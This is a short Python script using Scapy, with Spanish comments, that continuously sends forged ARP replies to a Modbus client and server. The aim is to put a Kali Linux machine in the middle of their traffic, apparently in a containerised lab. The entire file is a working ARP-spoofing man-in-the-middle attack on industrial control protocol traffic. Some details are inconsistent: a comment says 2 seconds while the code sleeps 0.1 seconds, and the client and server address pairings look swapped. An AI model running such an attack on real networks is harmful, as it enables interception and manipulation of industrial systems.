from scapy.all import *

# Direcciones MAC de los dispositivos involucrados
mac_cliente_modbus = "02:42:AC:11:00:03"  # MAC del cliente Modbus
mac_servidor_modbus = "02:42:AC:11:00:02"  # MAC del servidor Modbus
mac_kali_linux = "02:42:76:b5:c9:c0"  # MAC de la interfaz de red de Kali Linux

# Direcciones IP de los dispositivos
ip_cliente_modbus = "172.17.0.2"  # IP del cliente Modbus
ip_servidor_modbus = "172.17.0.3"  # IP del servidor Modbus

# Crear paquete ARP spoofing para redirigir tr√°fico
arp_cliente_modbus = ARP(op=2, psrc=ip_servidor_modbus, pdst=ip_cliente_modbus, hwdst=mac_cliente_modbus)
arp_servidor_modbus = ARP(op=2, psrc=ip_cliente_modbus, pdst=ip_servidor_modbus, hwdst=mac_servidor_modbus)

# Enviar paquetes ARP spoofing de forma continua
while True:
    try:
        send(arp_cliente_modbus, verbose=0)
        send(arp_servidor_modbus, verbose=0)
        time.sleep(0.1)  # Esperar 2 segundos antes de enviar el siguiente paquete
    except KeyboardInterrupt:
        break
